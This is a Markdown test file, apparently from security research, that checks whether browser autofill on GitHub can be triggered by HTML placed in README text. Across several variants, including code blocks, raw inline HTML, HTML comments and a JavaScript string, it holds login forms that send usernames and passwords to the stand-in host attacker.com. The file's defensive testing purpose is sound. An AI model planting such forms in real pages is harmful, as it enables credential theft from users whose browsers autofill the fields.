# Autofill Hijacking Test - GitHub Edition

This file tests whether browser autofill can be triggered by HdTML that appears as TEXT (not executed) on GitHub.

## Test 1: HTML in Code Block

```html
<form action="https://attacker.com/collect" method="POST">
  <input type="text" name="username" autocomplete="username" />
  <input type="password" name="password" autocomplete="current-password" />
  <input type="submit" value="Login" />
</form>
```

## Test 2: Inline HTML (won't render but might be parsed?)

<form action="https://attacker.com/collect" method="POST">
  <input type="text" name="username" autocomplete="username" />
  <input type="password" name="password" autocomplete="current-password" />
  <input type="submit" value="Login" />
</form>

## Test 3: HTML Entities (escaped)

&lt;form action="https://attacker.com/collect" method="POST"&gt;
  &lt;input type="text" name="username" autocomplete="username" /&gt;
  &lt;input type="password" name="password" autocomplete="current-password" /&gt;
  &lt;input type="submit" value="Login" /&gt;
&lt;/form&gt;

## Test 4: HTML Comment (for issue comments)

<!--
<form action="https://attacker.com/collect" method="POST">
  <input type="text" name="username" autocomplete="username" />
  <input type="password" name="password" autocomplete="current-password" />
  <input type="submit" value="Login" />
</form>
-->

## Test 5: Mixed with Real Content

Here's some normal text about a login form.

<input type="text" name="username" autocomplete="username" value="" />
<input type="password" name="password" autocomplete="current-password" value="" />

More normal text here.

## Test 6: JavaScript String (in code block)

```javascript
const maliciousHTML = `
  <form action="https://attacker.com/collect" method="POST">
    <input type="text" name="username" autocomplete="username" />
    <input type="password" name="password" autocomplete="current-password" />
    <input type="submit" value="Login" />
  </form>
`;
```

## Test 7: Data Attributes (sometimes GitHub allows these)

<div data-username-field="true" autocomplete="username"></div>
<div data-password-field="true" autocomplete="current-password"></div>

## Test 8: SVG with foreignObject (GitHub sanitizes this but worth trying)

```html
<svg>
  <foreignObject>
    <form>
      <input type="text" autocomplete="username" />
      <input type="password" autocomplete="current-password" />
    </form>
  </foreignObject>
</svg>
```d

## Expected Behavior

**Autofill should NOT trigger** on any of these because:
1. GitHub sanitizes/escapes HTML in Markdown
2. Code blocks are rendered as text
3. Autofill operates on the actual DOM, not text content

**However**, testing edge cases:
- Does autofill pre-parse the page source before sanitization?
- Are there race conditions during page load?
- Do browser extensions parse differently?

## How to Test

1. Upload this file to a GitHub repo as `README.md` or create a new file
2. View it on GitHub.com
3. Try clicking in different areas of the rendered page
4. Check if autofill suggestions appear
5. Check browser DevTools to see actual DOM vs source
6. Test in different browsers (Chrome, Firefox, Edge, Safari)

## Notes for Security Researchers

- GitHub uses DOMPurify and other sanitization
- Check Network tab for any unexpected POST requests
- Monitor console for errors about blocked content
- Test with browser autofill enabled for github.com domain
